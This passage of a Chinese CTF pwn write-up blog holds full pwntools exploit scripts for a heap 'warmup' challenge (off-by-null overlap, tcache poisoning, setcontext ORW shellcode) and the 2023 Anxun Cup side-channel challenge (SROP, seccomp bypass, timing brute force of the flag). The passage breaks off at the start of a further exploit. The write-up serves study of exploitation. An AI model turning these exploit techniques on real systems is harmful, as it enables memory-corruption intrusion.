class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./warmup&quot;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;120.24.69.11&#x27;,12700)</span></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x100</span>) <span class="comment">#0 A = P-&gt;fd</span></span><br><span class="line">add(<span class="number">0x108</span>-<span class="number">0x20</span>) <span class="comment">#1 barrier</span></span><br><span class="line">add(<span class="number">0x438</span>, <span class="string">b&quot;B0&quot;</span>*<span class="number">0x100</span>) <span class="comment">#2 B0 helper</span></span><br><span class="line">add(<span class="number">0x438</span>, <span class="string">b&quot;C0&quot;</span>*<span class="number">0x100</span>) <span class="comment">#3 C0 = P , P&amp;0xff = 0</span></span><br><span class="line">add(<span class="number">0x108</span>,<span class="string">b&#x27;4&#x27;</span>*<span class="number">0x100</span>) <span class="comment">#4 barrier</span></span><br><span class="line">add(<span class="number">0x488</span>, <span class="string">b&quot;H&quot;</span>*<span class="number">0x100</span>) <span class="comment"># H0. helper for write bk-&gt;fd. vitcim chunk.</span></span><br><span class="line">add(<span class="number">0x428</span>, <span class="string">b&quot;D&quot;</span>*<span class="number">0x100</span>) <span class="comment"># 6 D = P-&gt;bk</span></span><br><span class="line">add(<span class="number">0x108</span>) <span class="comment"># 7 barrier</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step 2 use unsortedbin to set p-&gt;fd =A , p-&gt;bk=D</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># A</span></span><br><span class="line">delete(<span class="number">3</span>) <span class="comment"># C0</span></span><br><span class="line">delete(<span class="number">6</span>) <span class="comment"># D</span></span><br><span class="line"><span class="comment"># unsortedbin: D-C0-A   C0-&gt;FD=A</span></span><br><span class="line">delete(<span class="number">2</span>) <span class="comment"># merge B0 with C0. preserve p-&gt;fd p-&gt;bk</span></span><br><span class="line">add(<span class="number">0x458</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x438</span> + p64(<span class="number">0x551</span>)[:-<span class="number">2</span>]) <span class="comment">#0 put A,D into largebin, split BC. use B1 to set p-&gt;size=0x551</span></span><br><span class="line"><span class="comment"># recovery</span></span><br><span class="line">add(<span class="number">0x418</span>)  <span class="comment">#2 C1 from ub</span></span><br><span class="line">add(<span class="number">0x428</span>)  <span class="comment">#3 bk  D  from largebin</span></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">b&quot;0&quot;</span>*<span class="number">0x100</span>)  <span class="comment">#6 fd    A from largein</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step3 use unsortedbin to set fd-&gt;bk</span></span><br><span class="line"><span class="comment"># partial overwrite fd -&gt; bk </span></span><br><span class="line">delete(<span class="number">6</span>) <span class="comment"># A=P-&gt;fd</span></span><br><span class="line">delete(<span class="number">2</span>) <span class="comment"># C1</span></span><br><span class="line"><span class="comment"># unsortedbin: C1-A ,   A-&gt;BK = C1</span></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span>)  <span class="comment"># 2 partial overwrite bk    A-&gt;bk = p</span></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step4 use ub to set bk-&gt;fd</span></span><br><span class="line">delete(<span class="number">6</span>) <span class="comment"># C1</span></span><br><span class="line">delete(<span class="number">3</span>) <span class="comment"># D=P-&gt;bk</span></span><br><span class="line"><span class="comment"># ub-D-C1    D-&gt;FD = C1</span></span><br><span class="line">delete(<span class="number">5</span>) <span class="comment"># merge D with H, preserve D-&gt;fd </span></span><br><span class="line">add(<span class="number">0x500</span>-<span class="number">8</span>, <span class="string">b&#x27;6&#x27;</span>*<span class="number">0x488</span> + p64(<span class="number">0x431</span>)) <span class="comment">#3 H1. bk-&gt;fd = p, partial write \x00</span></span><br><span class="line">add(<span class="number">0x3b0</span>) <span class="comment">#5 recovery</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step5 off by null</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x108</span>,<span class="number">0x100</span>*<span class="string">b&#x27;4&#x27;</span> + p64(<span class="number">0x550</span>))<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>) <span class="comment"># merge H1 with C0. trigger overlap C0,4,6</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">add(<span class="number">0x438</span>)<span class="comment">#3 put libc to chunk 4</span></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Note: &quot;</span>)</span><br><span class="line">libc.address = u64(p.recvline(<span class="literal">False</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - (<span class="number">0x7ffff7facce0</span>-<span class="number">0x7ffff7d93000</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line">system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x458</span>, <span class="number">0x438</span>*<span class="string">b&#x27;6&#x27;</span>+p64(<span class="number">0x111</span>)) <span class="comment"># fix size for chunk 4. 6 overlap 4</span></span><br><span class="line">delete(<span class="number">7</span>) <span class="comment"># tcache</span></span><br><span class="line">delete(<span class="number">4</span>) <span class="comment"># tcache</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Note: aaaaaaaa&quot;</span>)</span><br><span class="line">heap = u64(p.recvline(<span class="literal">False</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - (<span class="number">0x5555555605e0</span>- <span class="number">0x55555555f000</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">gadget=<span class="number">0x167230</span></span><br><span class="line"><span class="comment">#mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span></span><br><span class="line"><span class="comment">#target=0x1234 #要写入的地址</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x458</span>,<span class="number">0x438</span>*<span class="string">b&#x27;6&#x27;</span>+p64(<span class="number">0x111</span>)+p64(((heap&gt;&gt;<span class="number">12</span>)+<span class="number">1</span>)^(libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]+<span class="number">0xc0</span>)))<span class="comment">#3 fd需要用heap处理</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">aim=heap+<span class="number">0x2c0</span></span><br><span class="line">setcontext=libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line">mprotect=libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">shellcode += shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>,aim,<span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,aim,<span class="number">0x100</span>)</span><br><span class="line">payload3 = asm(shellcode)</span><br><span class="line">payload1=flat(</span><br><span class="line">    &#123;<span class="number">0xa8</span>:mprotect,</span><br><span class="line">    <span class="number">0x68</span>:heap,</span><br><span class="line">    <span class="number">0x70</span>:<span class="number">0x1000</span>,</span><br><span class="line">    <span class="number">0x88</span>:<span class="number">7</span>,</span><br><span class="line">    <span class="number">0x8</span>:aim,</span><br><span class="line">        <span class="number">0x78</span>:heap+<span class="number">0x1000</span>,</span><br><span class="line">        <span class="number">0x20</span>:setcontext,</span><br><span class="line">        <span class="number">0xa0</span>:aim+<span class="number">0x148</span>,</span><br><span class="line">        <span class="number">0x108</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="number">0x110</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="number">0x138</span>:aim,</span><br><span class="line">        <span class="number">0x128</span>:libc.address+gadget,</span><br><span class="line">        <span class="number">0x118</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="number">0x120</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="number">0x140</span>:<span class="number">1</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    filler = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">)</span><br><span class="line">add(<span class="number">0x418</span>,payload1+p64(aim+<span class="number">0x150</span>)+payload3)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;111&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">source ./libcdbg/loadsym.py</span></span><br><span class="line"><span class="string">loadsym /home/aichch/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/.debug/.build-id/89/c3cb85f9e55046776471fed05ec441581d1969.debug</span></span><br><span class="line"><span class="string">b puts</span></span><br><span class="line"><span class="string">b printf</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">)</span><br><span class="line">pause()</span><br><span class="line">add(<span class="number">0x100</span>,p32(<span class="number">0xffffffff</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">20</span>+p64(libc.address+<span class="number">0x2163c0</span>)+p64(aim+<span class="number">0xf0</span>)[:<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="flat的使用"><a href="#flat的使用" class="headerlink" title="flat的使用"></a>flat的使用</h2><p>flat是pwntools提供的数据平坦化函数,会自动转化小端序,不过要提前指定ARCH,否则默认4字节</p><p><strong>在构造setcontext,fake_io时可以提供便利</strong></p><p>以本题为例</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">flat(</span><br><span class="line">    &#123;   <span class="number">0xa8</span>:mprotect,</span><br><span class="line">        <span class="number">0x68</span>:heap,</span><br><span class="line">        <span class="number">0x70</span>:<span class="number">0x1000</span>,</span><br><span class="line">        <span class="number">0x88</span>:<span class="number">7</span>,</span><br><span class="line">        <span class="number">0x8</span>:aim,</span><br><span class="line">        <span class="number">0x78</span>:heap+<span class="number">0x1000</span>,</span><br><span class="line">        <span class="number">0x20</span>:setcontext,</span><br><span class="line">        <span class="number">0xa0</span>:aim+<span class="number">0x148</span>,</span><br><span class="line">        <span class="number">0x108</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="number">0x110</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="number">0x138</span>:aim,</span><br><span class="line">        <span class="number">0x128</span>:libc.address+gadget,</span><br><span class="line">        <span class="number">0x118</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="number">0x120</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="number">0x140</span>:<span class="number">1</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    filler = <span class="string">&#x27;\x00&#x27;</span>,</span><br><span class="line">    length=<span class="number">0x148</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>模板</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flat(</span><br><span class="line">    &#123;   </span><br><span class="line">        偏移(可不按顺序):值(自动小端序),</span><br><span class="line">    &#125;,</span><br><span class="line">    filler = <span class="string">&#x27;\x00&#x27;</span><span class="comment">#指定填充数据,不指定的话默认用cyclic生成填充</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>要对单个字节操作的话,也是一样的,不过要用b前缀<code>偏移:b&#39;x&#39;</code></p><h1 id="2023安洵杯-side-channel"><a href="#2023安洵杯-side-channel" class="headerlink" title="2023安洵杯-side-channel"></a>2023安洵杯-side-channel</h1><p>保护没开pie和canary</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_40136E</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">10</span>]; <span class="comment">// [rsp+6h] [rbp-2Ah] BYREF</span></span><br><span class="line">  _QWORD v2[<span class="number">4</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2[<span class="number">0</span>] = <span class="string">&#x27;onk u oD&#x27;</span>;</span><br><span class="line">  v2[<span class="number">1</span>] = <span class="string">&#x27;i tahw w&#x27;</span>;</span><br><span class="line">  v2[<span class="number">2</span>] = <span class="string">&#x27;\n?DIUS s&#x27;</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v1, <span class="string">&quot;easyhack\n&quot;</span>);</span><br><span class="line">  syscall(<span class="number">1LL</span>, <span class="number">1LL</span>, v1, <span class="number">9LL</span>);</span><br><span class="line">  syscall(<span class="number">0LL</span>, <span class="number">0LL</span>, &amp;unk_404060, <span class="number">4096LL</span>);</span><br><span class="line">  syscall(<span class="number">1LL</span>, <span class="number">1LL</span>, v2, <span class="number">24LL</span>);</span><br><span class="line">  sandbox();</span><br><span class="line">  syscall(<span class="number">0LL</span>, <span class="number">0LL</span>, v1, <span class="number">58LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一眼栈迁移rop,有沙盒</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0a</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0012</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x07</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0012</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x0000000a</span>  <span class="keyword">if</span> (A == mprotect) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x0000000f</span>  <span class="keyword">if</span> (A == rt_sigreturn) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000005a</span>  <span class="keyword">if</span> (A == chmod) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x000000e7</span>  <span class="keyword">if</span> (A != exit_group) <span class="keyword">goto</span> <span class="number">0012</span></span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0012</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>只允许了这几个调用,可以看到没有write结合题目名字,猜测是要侧信道爆破</p><p>找了一下发现没有可利用的gadget</p><p>那么要控制参数只能靠rt_sigreturn系统调用了</p><p>但问题又来了如何触发这个系统调用,一个想法是read读取15个字符,但可以观察到主函数中的所用系统调用在使用完后都会<code>mov eax,0</code></p><p>那么显然不行,不过可以在程序中找到另一个syscall</p><p><code>0x40118A#syscall; nop; pop rbp; ret;</code></p><p>但还有一个问题,即如何完成read系统调用的布置,之前已经说过程序中并没有这样的gadget可以利用,但我们可以发现在原程序最后ret的时候,rdi,rsi,rdx三个寄存器依然保持着最后一个系统调用read的状态,那么直接syscall触发读取15个字节即可,之后再返回到syscall触发srop</p><p>然后执行mprotect修改bss段权限,执行open和read,并增加一段shellcode用于逐个字符爆破</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shellcode+=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax,&#123;&#125;</span></span><br><span class="line"><span class="string">mov bl,[rax]</span></span><br><span class="line"><span class="string">cmp bl,&#123;&#125;</span></span><br><span class="line"><span class="string">jz  0x404000</span></span><br><span class="line"><span class="string">jmp $-0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x404800</span>+pos,char)</span><br></pre></td></tr></table></figure><p>如果相等则会直接段错误,但如果不等则会无限循环,等待程序处理</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./chall&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path)</span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script = <span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span>(script):</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">pos,char</span>):</span><br><span class="line">r()</span><br><span class="line">shellcode=shellcraft.chmod(<span class="string">&#x27;file&#x27;</span>,<span class="number">0o777</span>)</span><br><span class="line">shellcode+=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">shellcode+=shellcraft.read(<span class="number">3</span>,<span class="number">0x404800</span>,<span class="number">64</span>)</span><br><span class="line">shellcode+=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax,&#123;&#125;</span></span><br><span class="line"><span class="string">mov bl,[rax]</span></span><br><span class="line"><span class="string">cmp bl,&#123;&#125;</span></span><br><span class="line"><span class="string">jz  0x404000</span></span><br><span class="line"><span class="string">jmp $-0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x404800</span>+pos,char)</span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax=<span class="number">0xa</span></span><br><span class="line">sigframe.rdi=<span class="number">0x404000</span></span><br><span class="line">sigframe.rsi=<span class="number">0x1000</span></span><br><span class="line">sigframe.rdx=<span class="number">0x7</span></span><br><span class="line">sigframe.rip=syscall_ret</span><br><span class="line">sigframe.rsp=<span class="number">0x404460</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0x404460</span>)+p64(syscall_ret)+p64(<span class="number">0x404460</span>)+p64(syscall_ret)+<span class="built_in">bytes</span>(sigframe)</span><br><span class="line">payload=payload.ljust(<span class="number">0x400</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0x404460</span>)+p64(<span class="number">0x404470</span>)</span><br><span class="line">payload+=asm(shellcode,vma=<span class="number">0x400000</span>)<span class="comment">#pwntools asm带跳转的代码需要指定基址vma</span></span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2a</span>+p64(<span class="number">0x404060</span>)+p64(lr)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">s(payload)</span><br><span class="line">sleep(<span class="number">0.01</span>)</span><br><span class="line">s(<span class="string">b&#x27;f&#x27;</span>*<span class="number">0xf</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">string=<span class="string">b&quot;0123456789abcdef&#125;&quot;</span>      </span><br><span class="line"></span><br><span class="line">lr=<span class="number">0x401446</span></span><br><span class="line">syscall_ret=<span class="number">0x40118A</span><span class="comment">#syscall; nop; pop rbp; ret;</span></span><br><span class="line">pos=<span class="number">0</span></span><br><span class="line">b=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">time=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;pos:&#123;&#125; time:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(pos,time))</span><br><span class="line"><span class="comment">#p=process(elf_path)</span></span><br><span class="line">p=remote(<span class="string">&#x27;47.108.206.43&#x27;</span>,<span class="number">26052</span>)</span><br><span class="line">pwn(pos,i)</span><br><span class="line">r()</span><br><span class="line">time+=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">chr</span>(i)==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">b=<span class="number">1</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p.recv(timeout = <span class="number">1</span>)</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">flag += <span class="built_in">chr</span>(i)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> b==<span class="number">1</span> :</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">pos+=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;success:&#x27;</span>+flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 23099102-a168-11ee-8c62-00163e0447d0</span></span><br></pre></td></tr></table></figure><h1 id="2023安洵杯-seccomp"><a href="#2023安洵杯-seccomp" class="headerlink" title="2023安洵杯-seccomp"></a>2023安洵杯-seccomp</h1><p><strong>标签:沙盒|rop</strong></p><p>上一题的弱化版,不过远程打不开flag是什么鬼</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 